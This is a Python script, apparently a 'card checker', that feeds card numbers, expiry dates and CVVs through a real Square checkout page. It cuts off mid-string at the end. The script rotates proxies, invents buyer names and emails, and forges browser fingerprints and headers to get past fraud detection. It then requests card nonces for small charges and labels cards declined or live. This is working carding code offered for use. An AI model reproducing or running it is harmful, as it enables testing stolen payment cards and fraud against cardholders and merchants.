import names
import random
import time
import datetime
import re
import requests
import json
import AdyenEncrypt
import base64
from parse import parseX
import uuid


proxiess = "proxys.txt"

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

def capture_fecha_hora_actual():
    # Capturar la fecha y hora actual
    now = datetime.datetime.now()

    # Formatear la fecha y hora según tu especificación (YYYY-MM-DD HH:MM:SS)
    formatted_date_time = now.strftime("%Y-%m-%d %H:%M:%S")
    
    return formatted_date_time


def squared(tarjeta):
    try:
        splitter = tarjeta.split('|')
        ccnum = splitter[0]
        mes = splitter[1]
        cvv = splitter[3]
        ano = splitter[2]
        if len(ano) == 2:
            ano = "20" + ano
    

              
        fecha = capture_fecha_hora_actual()
        
        req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
        brand = req['brand']
        
        sessionid = generar_codigo_session()
        CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        
        
        session = requests.Session()
        with open(proxiess, 'r') as file:
            proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
        
        headers = {
            'authority': 'checkout.square.site',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': '__cf_bm=PcQK3PER2NwqcocpSrNVdtSOHpWIn5qCibTiZsscWv0-1707198342-1-AV1TuwYYI3q6Vxx+vGf2v0bSlP/Aa5HukZzrjJXDHLK7vmDYr2T+RKxKZPK5nhAKeFwm+rqHK0Z9w9/WuO5lqT0=; _sp_ses.7acb=*; square-sync-csrf=eyJpdiI6IkF5WmFwdjRNYlA1ZlhmQlBFb3M0ZXc9PSIsInZhbHVlIjoiUENBc2psK1dmOW1tM2pFOU0vSTNuaEIzSXc5UHExQTArSm1weXNrOFBnNDkwYUh6OVZCbXlKVFNYT1lHMlJIOVcwc2JLQVZhd1kzdjQ1K2VLVFI4b0F4MXRlRUdOUGM3YXowSGZHWEI1Ym5TQjIrYVRBL1ZxdXIyVkpFS3hkaXEiLCJtYWMiOiJiOTdhNzc2NjBjYjA5ZjAxMWY2NDBlZTRkZTcwMmQxMTY0N2MwYmRjYzcxMmI0ZjU0ZmIwYjUzOTBhYTFkNDM4IiwidGFnIjoiIn0%3D; square-sync_session=eyJpdiI6IjVtYzJYc3Y5UGt1a2Y0M1A4aExnS3c9PSIsInZhbHVlIjoiMVQwUGp0YUcvYmJFTklOTkpJd3BCblVpMkt4Z1A1ZEpBbmM1WUlZNFBhOHpCNHpuZmVEajVTZzBFMC9zRU9PT2l5Vi9CbjhONUJlWXNnSmhvZlNTck42eUZOL3pQZEJjQUZRcXVWMUNoN2d1a0xOQmUxL3lLdnZKOEFjL1ZXRFEiLCJtYWMiOiJkOTk2ZGE3ZmNlNmY4MWZhNzJlMWE0YWUyYTNjNDk5NjNmZjYyYmU3MzdmYzAzYWZlNzQwNzEzYTA3NGFhMmEzIiwidGFnIjoiIn0%3D; merchant:CBDZ8ZSCPVCJ5:order:sN0hYMKNeEVZoVxK8r2BXpOUGvIZY:locale=en-US; customer_xsrf=eyJpdiI6IjBoMUJTVG02SHQ1T0xQcTU4bFhHVUE9PSIsInZhbHVlIjoiamwvQTN0ZW9FRTFkdE0rNWcveGVCN2U1OGt3Smc5ZURiRkF6U1lwQ2xZQnhKaUFBbjB5UUhtU3lUek84Ynh1eTZIbEpjOXFucElwZVZJcndpNmNjV3E3djhKRFV5Z2JEcG5SOVBsRUhvSmNkbm9BczlHYjRCTGJ3NlkvUDk2L1QiLCJtYWMiOiI0OGExYTljYzcwZmNlN2ZlZTQ1Mjk1MGJmYjI5Y2RlMThkNDNmZmFhNzljZWM1NzZkOTQ5MzJiYTJjMGMyNzVmIiwidGFnIjoiIn0%3D; customer_session=eyJpdiI6IklCTHM1YWppdm9yaTJ5L1dxazhrQ2c9PSIsInZhbHVlIjoieFA2a3BZNTZvQnFidzBhYmNMU09jc1hNcFN0MjVseUQrMTVBSmIrWTFBaEVIUEpHVGJ4OXZ4SHhVM2QyNjZkRHJKdUFiTFNHYkp1UFJuVmlHdTdXN2hWVU1kUEt2Smtoek5qeGcrUFNMWlZyWFdiWkF6Y3lONTdRUjN4STdsR3MiLCJtYWMiOiJiZjYwNGVlODNhNjgzOTA5YmUxZGE3OTlmNTY3MDY2MzliNjUzYTY4MzYzZWNkMzdkYjMxYTA1MjE4ZDI4Y2MyIiwidGFnIjoiIn0%3D; pay_link_user_site=141423543%3A921006837658653084; _sp_id.7acb=5e5b7283-dad5-482d-89fd-6c8ff3afc929.1707198345.1.1707198893.1707198345.5d07baa6-ec9e-47d9-a952-63c167e20a52; _dd_s=rum=1&id=2ceef470-1d7f-4939-bee9-04cc84d16016&created=1707198344064&expire=1707199843630',
            'origin': 'https://checkout.square.site',
            'referer': 'https://checkout.square.site/merchant/6ASXGPPCCMBRF/checkout/UQT23WV2VGBUUDBKAFXSOJTQ',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'buyerControlledPrice': {
                'amount': 300,
                'currency': 'USD',
                'precision': 2,
            },
            'subscriptionPlanId': None,
            'oneTimePayment': True,
            'itemCustomizations': [],
        }

        response = session.post(
            'https://checkout.square.site/api/merchant/6ASXGPPCCMBRF/checkout/UQT23WV2VGBUUDBKAFXSOJTQ',
            headers=headers,
            json=json_data,
        ).text
        
        order = parseX(response, '"order":{"id":"','"')
        print(order)
        location = parseX(response, '"location_id":"','"')
        print(location)
        
        headers = {
            'authority': 'checkout.square.site',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': '__cf_bm=PcQK3PER2NwqcocpSrNVdtSOHpWIn5qCibTiZsscWv0-1707198342-1-AV1TuwYYI3q6Vxx+vGf2v0bSlP/Aa5HukZzrjJXDHLK7vmDYr2T+RKxKZPK5nhAKeFwm+rqHK0Z9w9/WuO5lqT0=; _sp_ses.7acb=*; square-sync-csrf=eyJpdiI6IkF5WmFwdjRNYlA1ZlhmQlBFb3M0ZXc9PSIsInZhbHVlIjoiUENBc2psK1dmOW1tM2pFOU0vSTNuaEIzSXc5UHExQTArSm1weXNrOFBnNDkwYUh6OVZCbXlKVFNYT1lHMlJIOVcwc2JLQVZhd1kzdjQ1K2VLVFI4b0F4MXRlRUdOUGM3YXowSGZHWEI1Ym5TQjIrYVRBL1ZxdXIyVkpFS3hkaXEiLCJtYWMiOiJiOTdhNzc2NjBjYjA5ZjAxMWY2NDBlZTRkZTcwMmQxMTY0N2MwYmRjYzcxMmI0ZjU0ZmIwYjUzOTBhYTFkNDM4IiwidGFnIjoiIn0%3D; square-sync_session=eyJpdiI6IjVtYzJYc3Y5UGt1a2Y0M1A4aExnS3c9PSIsInZhbHVlIjoiMVQwUGp0YUcvYmJFTklOTkpJd3BCblVpMkt4Z1A1ZEpBbmM1WUlZNFBhOHpCNHpuZmVEajVTZzBFMC9zRU9PT2l5Vi9CbjhONUJlWXNnSmhvZlNTck42eUZOL3pQZEJjQUZRcXVWMUNoN2d1a0xOQmUxL3lLdnZKOEFjL1ZXRFEiLCJtYWMiOiJkOTk2ZGE3ZmNlNmY4MWZhNzJlMWE0YWUyYTNjNDk5NjNmZjYyYmU3MzdmYzAzYWZlNzQwNzEzYTA3NGFhMmEzIiwidGFnIjoiIn0%3D; merchant:CBDZ8ZSCPVCJ5:order:sN0hYMKNeEVZoVxK8r2BXpOUGvIZY:locale=en-US; customer_xsrf=eyJpdiI6IjBoMUJTVG02SHQ1T0xQcTU4bFhHVUE9PSIsInZhbHVlIjoiamwvQTN0ZW9FRTFkdE0rNWcveGVCN2U1OGt3Smc5ZURiRkF6U1lwQ2xZQnhKaUFBbjB5UUhtU3lUek84Ynh1eTZIbEpjOXFucElwZVZJcndpNmNjV3E3djhKRFV5Z2JEcG5SOVBsRUhvSmNkbm9BczlHYjRCTGJ3NlkvUDk2L1QiLCJtYWMiOiI0OGExYTljYzcwZmNlN2ZlZTQ1Mjk1MGJmYjI5Y2RlMThkNDNmZmFhNzljZWM1NzZkOTQ5MzJiYTJjMGMyNzVmIiwidGFnIjoiIn0%3D; customer_session=eyJpdiI6IklCTHM1YWppdm9yaTJ5L1dxazhrQ2c9PSIsInZhbHVlIjoieFA2a3BZNTZvQnFidzBhYmNMU09jc1hNcFN0MjVseUQrMTVBSmIrWTFBaEVIUEpHVGJ4OXZ4SHhVM2QyNjZkRHJKdUFiTFNHYkp1UFJuVmlHdTdXN2hWVU1kUEt2Smtoek5qeGcrUFNMWlZyWFdiWkF6Y3lONTdRUjN4STdsR3MiLCJtYWMiOiJiZjYwNGVlODNhNjgzOTA5YmUxZGE3OTlmNTY3MDY2MzliNjUzYTY4MzYzZWNkMzdkYjMxYTA1MjE4ZDI4Y2MyIiwidGFnIjoiIn0%3D; pay_link_user_site=141423543%3A921006837658653084; _sp_id.7acb=5e5b7283-dad5-482d-89fd-6c8ff3afc929.1707198345.1.1707198893.1707198345.5d07baa6-ec9e-47d9-a952-63c167e20a52; _dd_s=rum=1&id=2ceef470-1d7f-4939-bee9-04cc84d16016&created=1707198344064&expire=1707199843630',
            'origin': 'https://checkout.square.site',
            'referer': 'https://checkout.square.site/merchant/6ASXGPPCCMBRF/checkout/UQT23WV2VGBUUDBKAFXSOJTQ',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        response = session.patch(
            f'https://checkout.square.site/api/merchant/6ASXGPPCCMBRF/location/{location}/order/{order}/visited',
            #cookies=cookies,
            headers=headers,
        ).text
        
        
        
        headers = {
            'authority': 'connect.squareup.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': '_savt=ba66372b-b577-4d9d-b455-db07f46d4702; __cf_bm=FD_PFFRXKm5XCRXAnV2yNdbdMNeg8WR3AOtx2iMzW5Q-1707198358-1-AVbRj/Ms2fO6oRFhjfMjYVgLrihuOUbVXYO/cKdvrEEOXM2cmIzUZy6PJ8gPqrS0Fw7so7wCGiic83Gw0psQZk8=',
            'origin': 'https://connect.squareup.com',
            'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fcheckout.square.site%2Fmerchant%2F6ASXGPPCCMBRF%2Fcheckout%2FUQT23WV2VGBUUDBKAFXSOJTQ',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0","language":"en-US","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,728],"timezone_offset":0,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
            'fingerprint': 'a1dc69f00989c11df316a6267fb17ee8',
            'timezone': '0',
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            'version': 'bac121128c321eaecf610479b4c4ff432161e82c',
            'website_url': 'https://checkout.square.site/',
            'client_id': 'sq0idp-w46nJ_NCNDMSOywaCY0mwA',
            'browser_fingerprint_by_version': [
                {
                    'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0","language":"en-US","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,728],"timezone_offset":0,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"a1dc69f00989c11df316a6267fb17ee8"}',
                    'payload_type': 'fingerprint-v1',
                },
                {
                    'payload_json': '{"components":{"language":"en-US","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,728],"timezone_offset":0,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"f1e45d3829f6b22191066cb093cf1d44"}',
                    'payload_type': 'fingerprint-v1-sans-ua',
                },
            ],
        }

        response = session.post('https://connect.squareup.com/v2/analytics/token', headers=headers, json=json_data).json()
        
        token = response['token']
        
        
        headers = {
            'authority': 'checkout.square.site',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': '__cf_bm=PcQK3PER2NwqcocpSrNVdtSOHpWIn5qCibTiZsscWv0-1707198342-1-AV1TuwYYI3q6Vxx+vGf2v0bSlP/Aa5HukZzrjJXDHLK7vmDYr2T+RKxKZPK5nhAKeFwm+rqHK0Z9w9/WuO5lqT0=; _sp_ses.7acb=*; merchant:CBDZ8ZSCPVCJ5:order:sN0hYMKNeEVZoVxK8r2BXpOUGvIZY:locale=en-US; pay_link_user_site=141423543%3A921006837658653084; square-sync-csrf=eyJpdiI6ImFQSVBMYTVpMm9DQ1RJblg0Z0ZqaXc9PSIsInZhbHVlIjoic1dDQmJodlgyZG9SdVJMTlRIdUxQMDdRT2N0ck84aS9uRGlGTkVhOEd5aUlTeXNycUpJbG5Td2E1cnBTNXlReElQeVh3VVd3SFNXaDk3Zk9rbWk4eUMvc3VVTkN5RE1FRDVuNEZ2Smk5V2RsRHROQVdENGVDUW5EOGxZREFWMFEiLCJtYWMiOiJlYmE5MjcxN2UxOGFlYTYzYjkwZDBiMGQ1YzU3ZjQ0MTQ0NWI0YzI3NzM2NDFlMTlmNmU0YzhkZDg4OGI2YmMzIiwidGFnIjoiIn0%3D; square-sync_session=eyJpdiI6IlhrM1BrVFQyYVQ5QWxTZDN1L2tzQnc9PSIsInZhbHVlIjoickhORk0wV1MydWdTMUFENTR6R3pHRFE1UVRCRi8xRXU3TG9CcStqaDlSV2hwUXRReXBEa1JiR2lTcE83ODVKZWRGWHpMdlNvSTNLeHQ1b3lJM0pnWkpUTEg4YTNjeVR4SkJLYjlXZU83a2lteGxzT0d1bWkzWGhJUW1BK3pFL24iLCJtYWMiOiI5MWQ2MGRhOThjMDA5ZjUxZDg0YWNiNzYzMWQ1MmJjMDI0ZWVlODQwY2MwMWUxZWJiOGJmZmIxOGJiODE3Yjk0IiwidGFnIjoiIn0%3D; merchant:6ASXGPPCCMBRF:order:oNG3FRtgR8yIgXuDp1DbOaTVPOJZY:locale=en-US; customer_xsrf=eyJpdiI6IitZUGJCZHB2UmdOV093cjBudHQvMmc9PSIsInZhbHVlIjoiNjlrdGZERzdnbjlGUXVrRjhXV2lpc1cyci9JOTNERTA2NlF1Q3lCZnJ0TThxZ1ZWMmpPcFVpc0d3Q2JTWFgzN0ZHandrTUlTRjFNOWQ5K0pHLy81UU40RWVUc3UyNE0vT1YrTDlPVml4VGVETXN4QnRNZGxYTlVWOXI3VlVaaTkiLCJtYWMiOiIzYTNkMDU0MTU0MDJiZjU1MjI2MDBkOWQ3MzUzYWY0MTExYjM5YmEwY2U0ZDI2ZjdjNGU1NGRlZWNjZmJmOGYwIiwidGFnIjoiIn0%3D; customer_session=eyJpdiI6IldEMmhiMUJ6Q2c5enNaSmVyU0pNc3c9PSIsInZhbHVlIjoiVHhqOUNOcXBOUkZySFZvbmprdmpRMEtzYUJlUVJEYys0VWdQWkNlT0dOeFdXM0pxVjFBWFdDT3pzeTQxYW05UTVXSDhJMzNjOWo1eXNIa0ozKzRjaFZTa01wRVJMK3B3WlN2elh2QWVNanZDL1gxLzVDcFhBUXExdWxGSXAzQlkiLCJtYWMiOiI5N2YwMjY2OTJlZmJmNjcyYzIzYTdjNjg4ODRhM2VjYTllNzE1N2IyNWNlMzg4Y2FjNjZmMmI2ZGM4MGNjYTcwIiwidGFnIjoiIn0%3D; _sp_id.7acb=5e5b7283-dad5-482d-89fd-6c8ff3afc929.1707198345.1.1707198956.1707198345.5d07baa6-ec9e-47d9-a952-63c167e20a52; _dd_s=rum=1&id=2ceef470-1d7f-4939-bee9-04cc84d16016&created=1707198344064&expire=1707199856817',
            'origin': 'https://checkout.square.site',
            'referer': 'https://checkout.square.site/merchant/6ASXGPPCCMBRF/checkout/UQT23WV2VGBUUDBKAFXSOJTQ',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'given_name': 'Andres',
            'family_name': 'Bermudez',
            'email_address': CorreoRand,
            'phone_number': {
                'national_number': '2486354657',
                'region_code': 'US',
                'country_code': '1',
                'formatted': '',
            },
            'shipping_address': {
                'first_name': 'Andres',
                'last_name': 'Bermudez',
                'phone': {
                    'national_number': '2486354657',
                    'region_code': 'US',
                    'country_code': '1',
                    'formatted': '',
                },
                'label': 'Shipping',
            },
        }

        response = session.patch(
            f'https://checkout.square.site/api/soc-platform/merchant/6ASXGPPCCMBRF/location/{location}/order/{order}/customer',
            #cookies=cookies,
            headers=headers,
            json=json_data,
        ).text

    
        
        headers = {
            'authority': 'pci-connect.squareup.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=utf-8',
            # 'cookie': 'OptanonAlertBoxClosed=2024-02-06T05:00:26.743Z; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Feb+06+2024+05%3A01%3A03+GMT%2B0000+(Coordinated+Universal+Time)&version=202301.2.0&isIABGlobal=false&hosts=&consentId=554d8d45-25a2-4b01-9e7e-f2bbfc683abe&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&geolocation=DE%3B&AwaitingReconsent=false; __cf_bm=S.0h_onCgqdpHiSeHBBtfDcGYCTRIrUEm3uMSHy16xc-1707196621-1-AWpXoWZaCEgxB9vOCJy0H8YLNx0qhhPu5qRB6DgCoZPsn7zFUzPK0OyeqL4pqhTpcKaf4up94seyh6zqqr7lXaM=; _savt=4defebec-35d2-4eaf-9721-932ebe2a7cc5; __cf_bm=azAI.ZDL5UkJexJ862Z1OPncsrlISvpkt78tyrmiRL8-1707197040-1-Adt309cEHAE4RVPRDPQSF0M8vummMkefm8FlXUlBW/hKsJuWBM+3jiip+KGNkSU9IuCLx1q5QxMRAoG/HztJux4=',
            'origin': 'https://web.squarecdn.com',
            'referer': 'https://web.squarecdn.com/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        params = {
            'applicationId': 'sq0idp-w46nJ_NCNDMSOywaCY0mwA',
            'hostname': 'checkout.square.site',
            'locationId': location,
            'version': '1.54.6',
        }


        response = session.get('https://pci-connect.squareup.com/payments/hydrate', params=params, headers=headers).text
        
        session2 = parseX(response, '"sessionId":"','"')

        print(session2)
        
            
        headers = {
            'authority': 'pci-connect.squareup.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=utf-8',
            # 'cookie': '__cf_bm=nlJ_fCQxYHm6zh8MDXdSnxd4GRKhmTuP9hcJoJN0bR4-1707191954-1-ATq83hwMlguzeRgBuBLR6BN9evQwu9WqsajYe/BpZI9d1GEQSr0JonhSxmRDvTO7EZOq7crrmzQMfka5gtz1mZM=; _savt=5943bcf8-517a-4dfa-ad5f-62a730a9f5e0',
            'origin': 'https://web.squarecdn.com',
            'referer': 'https://web.squarecdn.com/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        params = {
            '_': '1707191978262.194',
            'version': '1.54.6',
        }

        json_data = {
            'client_id': 'sq0idp-w46nJ_NCNDMSOywaCY0mwA',
            'location_id': location,
            'payment_method_tracking_id': 'c24495d3-e17c-9ae8-900a-114cdf5318cf',
            'session_id': session2,
            'website_url': 'checkout.square.site',
            'analytics_token': token,
            'card_data': {
                'cvv': cvv,
                'exp_month': int(mes),
                'exp_year': int(ano),
                'number': ccnum,
            },
        }

        response = session.post(
            'https://pci-connect.squareup.com/v2/card-nonce',
            params=params,
            headers=headers,
            json=json_data,
        ).json()
        
        
        if "card_nonce" not in response:
            msg = "DECLINED ❌"
            respuesta = "Card number incorrect."
            return msg, respuesta
        
        cnon = response['card_nonce']
        
        print(cnon)
        
        headers = {
            'authority': 'connect.squareup.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': '_savt=ba66372b-b577-4d9d-b455-db07f46d4702; __cf_bm=FD_PFFRXKm5XCRXAnV2yNdbdMNeg8WR3AOtx2iMzW5Q-1707198358-1-AVbRj/Ms2fO6oRFhjfMjYVgLrihuOUbVXYO/cKdvrEEOXM2cmIzUZy6PJ8gPqrS0Fw7so7wCGiic83Gw0psQZk8=',
            'origin': 'https://connect.squareup.com',
            'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fcheckout.square.site%2Fmerchant%2F6ASXGPPCCMBRF%2Fcheckout%2FUQT23WV2VGBUUDBKAFXSOJTQ',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'browser_fingerprint_by_version': [
                {
                    'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0","language":"en-US","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,728],"timezone_offset":0,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"a1dc69f00989c11df316a6267fb17ee8"}',
                    'payload_type': 'fingerprint-v1',
                },
                {
                    'payload_json': '{"components":{"language":"en-US","color_depth":24,"resolution":[1366,768],"available_resolution":[1366,728],"timezone_offset":0,"session_storage":1,"local_storage":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Calibri","Cambria","Cambria Math","Comic Sans MS","Consolas","Courier","Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode","Microsoft Sans Serif","MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Palatino Linotype","Segoe 